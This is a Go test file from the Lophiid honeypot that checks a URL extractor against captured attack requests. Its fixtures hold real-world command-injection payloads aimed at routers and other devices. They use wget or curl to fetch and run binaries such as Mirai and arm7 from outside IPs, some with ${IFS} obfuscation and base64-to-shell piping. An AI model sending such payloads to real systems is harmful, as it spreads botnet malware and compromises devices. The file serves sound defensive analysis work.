// Lophiid distributed honeypot
// Copyright (C) 2024 Niels Heinen
//
// This program is free software; you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the
// Free Software Foundation; either version 2 of the License, or (at your
// option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
// or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
package extractors

import (
	"fmt"
	"lophiid/pkg/database/models"
	"lophiid/pkg/util/constants"
	"testing"
)

func TestExtractUrls(t *testing.T) {
	for _, test := range []struct {
		description  string
		textToSearch string
		urlsToFind   []string
	}{
		{
			description:  "finds full url",
			textToSearch: "http://www.example.org/foo?aa=bb&cc=dd#oo",
			urlsToFind:   []string{"http://www.example.org/foo?aa=bb&cc=dd#oo"},
		},
		{
			description:  "finds multiple urls",
			textToSearch: "http://www.example.org/ http://127.0.0.1/",
			urlsToFind:   []string{"http://www.example.org/", "http://127.0.0.1/"},
		},
		{
			description:  "finds multiple urls",
			textToSearch: "http://www.example.org/ http://127.0.0.1/",
			urlsToFind:   []string{"http://www.example.org/", "http://127.0.0.1/"},
		},
		{
			description:  "finds from shell script",
			textToSearch: "cd /dev;wget http://117.253.245.157:38630/i;chmod ",
			urlsToFind:   []string{"http://117.253.245.157:38630/i"},
		},
		{
			description:  "finds from command injection",
			textToSearch: "exefile=cd /tmp; wget http://interpol.edu.pl/fuez/potar.sh -O jdsp.sh; chmod 777 jdsp.sh;sh jdsp.sh Avtech;rm -rf jdsp.sh",
			urlsToFind:   []string{"http://interpol.edu.pl/fuez/potar.sh"},
		},
		{
			description:  "finds multiple urls, one ip based",
			textToSearch: "http://www.example.org/ 127.0.0.1/aa.sh",
			urlsToFind:   []string{"http://www.example.org/", "127.0.0.1/aa.sh"},
		},
		{
			description:  "finds multiple urls, one ip based with port",
			textToSearch: "http://www.example.org/ 127.0.0.1:8000/aa.sh",
			urlsToFind:   []string{"http://www.example.org/", "127.0.0.1:8000/aa.sh"},
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			r := ExtractUrls(test.textToSearch)
			if len(r) != len(test.urlsToFind) {
				t.Errorf("expected %d, got %d urls (%v)", len(test.urlsToFind), len(r), r)
			}

			left := make(map[string]bool)
			for _, a := range r {
				left[a] = true
			}

			for _, a := range test.urlsToFind {
				if _, ok := left[a]; !ok {
					t.Errorf("not in: %s -> %v", a, left)
				}
			}

		})
	}
}

func TestURLExtractor(t *testing.T) {
	for _, test := range []struct {
		description string
		request     models.Request
		urlsToFind  []string
	}{
		{
			description: "Find URL in body",
			urlsToFind:  []string{"http://www.example.org/"},
			request: models.Request{

				Uri:        "/ignored?aa=bb",
				Raw:        "nothing",
				Body:       []byte("dsd http://www.example.org/ fd"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Ignores honeypot IP",
			urlsToFind:  []string{},
			request: models.Request{
				Uri:        "/ignored?aa=bb",
				Raw:        "nothing",
				Body:       []byte("dsd http://1.1.1.1/ fd"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body (no encoding header)",
			urlsToFind:  []string{"http://115.55.237.117:51813/Mozi.m"},
			request: models.Request{
				Uri:        "/ignored?aa=bb",
				Raw:        "ssadsa",
				Body:       []byte("XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://115.55.237.117:51813/Mozi.m+-O+->/tmp/gpon80"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body (encoded)",
			urlsToFind:  []string{"http://192.210.162.147/arm7"},
			request: models.Request{
				Uri:        "/ignored?aa=bb",
				Raw:        "ssadsa application/x-www-form-urlencoded ds",
				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body (not encoded, with semi colon)",
			urlsToFind:  []string{"http://1.2.3.4/arm7"},
			request: models.Request{

				Uri:        "/ignored?aa=bb",
				Raw:        "ssadsads",
				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://1.2.3.4/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in query string",
			urlsToFind:  []string{"94.103.87.71/cf.sh"},
			request: models.Request{

				Uri:        "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
				Raw:        "ssadsads",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in query param name",
			urlsToFind:  []string{"http://64.83.132.82/malware/mirai.sh"},
			request: models.Request{

				Uri:        "/shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F64.83.132.82%2Fmalware%2Fmirai.sh%3B%20sh%20mirai.sh",
				Raw:        "ssadsads",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},

		{
			description: "Find URL in query string (not encoded)",
			urlsToFind:  []string{"http://45.86.155.249/bestone/.nekoisdaddy.mips"},
			request: models.Request{

				Uri:        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.86.155.249/bestone/.nekoisdaddy.mips+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
				Raw:        "ssadsads",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body with + string",
			urlsToFind:  []string{"http://185.225.73.177/arm7"},
			request: models.Request{

				Uri:        "/",
				Raw:        "ssadsads Content-Type: application/x-www-form-urlencoded U",
				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://185.225.73.177/arm7;chmod+777+arm7;./arm7 rep.zyxel;rm+-rf+arm7%"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body with ${IFS} string",
			urlsToFind:  []string{"http://193.32.162.x/jobs/tp"},
			request: models.Request{

				Uri:        "/?act=op&ofid=1&uid=1&vid=1&lid=1&cid=1&pid=1_\"';curl${IFS}-s${IFS}'http://193.32.162.x/jobs/tp'${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh;",
				Raw:        "not important",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body with $IFS string",
			urlsToFind:  []string{"http://45.61.139.121/di"},
			request: models.Request{

				Uri:        "/shell.php?cmd=curl$IFShttp://45.61.139.121/di",
				Raw:        "not important",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},

		{
			description: "Find URL in encoded body without urlencoded header",
			urlsToFind:  []string{"http://104.168.5.4/forti.sh"},
			request: models.Request{

				Uri:        "/",
				Raw:        "",
				Body:       []byte("ajax=1&username=test&realm=&enc=cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Fforti.sh%3B%20chmod%20777%20forti.sh%3B%20.%2Fforti.sh"),
				HoneypotIP: "1.1.1.1",
			},
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			fmt.Printf("TEST: %s\n", test.description)
			result := make(map[string]struct{})

			ex := NewURLExtractor(result)
			ex.ParseRequest(&test.request)
			if len(result) != len(test.urlsToFind) {
				t.Errorf("expected %d, got %d urls (%v)", len(test.urlsToFind), len(result), result)
			}

			mds := ex.GetMetadatas(42)
			foundUrls := make(map[string]bool)
			for _, md := range mds {
				foundUrls[md.Data] = true
				if md.Type != constants.ExtractorTypeLink {
					t.Errorf("expected %s, got %s", constants.ExtractorTypeLink, md.Type)
				}
			}

			for _, a := range test.urlsToFind {
				if _, ok := foundUrls[a]; !ok {
					t.Errorf("not in: %s -> %v", a, foundUrls)
				}
			}

		})
	}
}
